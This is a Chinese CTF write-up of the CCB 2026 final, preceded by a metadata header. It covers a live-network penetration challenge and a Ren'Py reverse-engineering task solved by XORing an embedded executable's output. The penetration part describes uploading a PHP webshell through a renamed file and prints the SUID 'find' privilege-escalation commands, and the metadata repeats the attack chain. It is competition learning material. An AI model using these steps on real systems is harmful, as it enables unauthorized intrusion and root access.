---
title: CCB 决赛有感 (附 RE/AI 题目附件)
contest: CCB
year: 2026
difficulty: medium
vuln_type: web_unknown
tags:
- 实网渗透
- schema.sql
- 文件上传改后缀PHP
- find -perm -4000 提权
- fscan扫描
- DokiLogic Renpy rpyc
- unrpyc解密
- 1.exe XOR 35
- app.java邮件网关
attack_chain:
- '实网渗透: 扫目录 → schema.sql → 账号密码 → 后台文件上传 → 改后缀 PHP'
- 上线 supershell → find SUID 提权
- /usr/bin/find . -exec /bin/bash -p ; -quit
- fscan 扫到 app.java + protokms 邮件网关 → 触及盲区
- 'DokiLogic: Renpy 游戏, script.rpyc → unrpyc 解'
- 主程序释放 1.exe, 捕获其输出
- 输入字符串 XOR 35 与 exe 输出比较
- flag = 1.exe 输出 XOR 35
key_payload: '''schema.sql / 后台 PHP 改后缀 / find SUID 提权 / unrpyc / 1.exe XOR 35 / protokms 邮件网关'''
one_liner: CCB 决赛有感 — 实网渗透 schema.sql + 后台 PHP 改后缀 + find SUID 提权 + DokiLogic Renpy 1.exe XOR 35 还原 flag。
lesson: 实网渗透 4 步曲:目录扫 → 凭据/源码 → 上传 RCE → SUID 提权;Renpy .rpyc 必用 unrpyc 解;1.exe 硬编码可在 rpy 中提取后 python 调执行再 XOR。
quality: medium
full_path: CCB决赛有感(附RE-AI题目附件).full.md
meta_path: CCB决赛有感(附RE-AI题目附件).meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 'CCB 决赛有感 (附 RE/AI 题目附件)。CCB 决赛有感 — 实网渗透 schema.sql + 后台 PHP 改后缀 + find SUID 提权 + DokiLogic Renpy 1.exe XOR 35 还原 flag。。关键路径：实网渗透: 扫目录 → schema.sql → 账号密码 → 后台文件上传 → 改后缀 PHP → 上线 supershell → find S...'
category: web
subcategory: web_other
tools_used:
- PHP
- Python
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/306981.html
reasoning_chain:
- 触发点：现场实网靶机，dirsearch 扫出 schema.sql + 后台 manage.php → 假设：schema.sql 含数据库凭据
- 动作：cat schema.sql → 观察：admin 密码明文 + manage.php 登录后台 → 下一步：登录拿 token
- 假设：后台有 file upload 但有后缀黑名单 → 动作：上传 shell.php 抓包 Content-Disposition 改后缀为 .php → 观察：webshell 上线
- 下一步：发现目标机上 find 是 SUID 二进制 → 动作：find / -perm -4000 -type f → 观察：只有 /usr/bin/find
- 动作：find . -exec /bin/bash -p ; -quit → 观察：bash -p 保留特权 + bash shell，提权成功
- 下一步：跑 fscan 横向探测 → 观察：拿到 app.java + protokms 邮件网关，但触及协议盲区
- RE 路线切换触发点：DokiLogic 游戏打开要求输入字符串 → 动作：路径下找 script.rpyc 文件
- 假设：.rpyc 是 Renpy 编译产物 → 动作：用 unrpyc 解出 script.rpy → 观察：主程序释放 1.exe 硬编码
- 下一步：执行硬编码的 1.exe 捕获输出 → 动作：subprocess.run 把输出 XOR 35 → 观察：flag{输入}
failed_attempts:
- 试图直接 unzip 看 schema.sql → 失败：SQL 文件不在 zip 内，是 dirsearch 扫到的暴露文件
- 试图用 SQL 注入登后台 → 失败：密码明文在 schema 直接读了，注入都用不上
- 试图不解密 1.exe 直接用 strings 看 → 失败：strings 找不到 XOR 35 的关联逻辑
- 试图用 docker 启动 app.java → 失败：触及 fscan 邮件网关协议盲区，潦草退场
key_observations:
- 实网渗透 4 步曲：目录扫 → 凭据/源码泄漏 → 文件上传 getshell → SUID 提权
- find SUID 提权是 find . -exec /bin/bash -p ; -quit 的经典 GTFOBins 套路
- Renpy .rpyc 编译产物必须用 unrpyc 反编译，否则看不到 game logic
- 硬编码 1.exe 输出 XOR 35 是解密逻辑反过来：输出 XOR 35 = 用户输入
- 现场盲区（fscan 邮件网关）很正常，赛后复现比硬刚效率高
prerequisites:
- dirsearch/dirmap 目录扫描工具
- SUID 提权 GTFOBins 库
- Renpy .rpyc 工具链 (unrpyc)
- fscan 横向探测工具基础
- Python subprocess 调 EXE + 异或还原
---
# CCB决赛有感(附RE/AI题目附件)

> 原文: https://www.ctfiot.com/306981.html
> ID: 306981

“赛场很大,灯光很亮,茶歇很好吃  Ψ(￣∀￣)Ψ”

真是吃了没有pwn手的亏了,java基础也太薄弱了…..

话说,现场大佬好多，膜拜膜拜….

来张赛场照

实网渗透：

扫目录

找到一个schema.sql文件

找到账号密码,后台文件上传点上传文件，抓包修改后缀为php,成功拿到初步shell

上线 supershell ，发现find有suid权限，直接提权

find / -perm -4000 -type f -exec ls -la {} 2>/dev/null ;

/usr/bin/find . -exec /bin/bash -p ; -quit

拿到flag了,后面fscan扫描拿到一个app.java和一个protokms（一个邮件网关的软件）一下触及到盲区了…潦草退场了。

专项能力赛

DokiLogic

下载题目附件给了一个Renpy的游戏，打开就提示让输出answer,再没什么东西。 在路径下找到一个scrpit.rpyc文件不出意外就是flag的逻辑所在了

但是!我没有解密这个文件的脚本 /(ㄒoㄒ)/~~ ,以下来自赛后复现….

用unrpyc解密rpyc:
https://github.com/CensoredUsername/unrpyc

拿到script.rpy

重点逻辑就是,主程序运行后会释放一个1.exe,然后

捕获其输出，在游戏开始时要求输入一个字符串，将该字符串每个字符与 35 异或后，与之前捕获的 exe 输出比较，若相等则提示用

flag{输入}

格式提交，否则重试。

因此，正确的输入就是 exe 输出与 35 再次异或的结果

直接把硬编码的1.exe粘出来用python脚本直接获取输出然后异或就可以拿到flag了，我就说怎么这么多解…. 还是储备太少了,没有解密脚本。

附上exp

import subprocess
import os

_f = b'MZx90x00...'  # rpy里的_f也就是1.exe的硬编码数据

with open('temp.exe', 'wb') as f:
    f.write(_f)

output = subprocess.run('temp.exe', stdout=subprocess.PIPE).stdout.decode('latin-1')
os.remove('temp.exe')

flag_input = "".join(chr(ord(c) ^ 35) for c in output)
print(f'flag{{{flag_input}}}')

最后的最后,公众号后台回复:
CCB2026拿题目附件(RE/AI)


```
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null ;
/usr/bin/find . -exec /bin/bash -p ; -quit
import subprocess
import os

_f = b'MZx90x00...'  # rpy里的_f也就是1.exe的硬编码数据

with open('temp.exe', 'wb') as f:
    f.write(_f)

output = subprocess.run('temp.exe', stdout=subprocess.PIPE).stdout.decode('latin-1')
os.remove('temp.exe')

flag_input = "".join(chr(ord(c) ^ 35) for c in output)
print(f'flag{{{flag_input}}}')
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]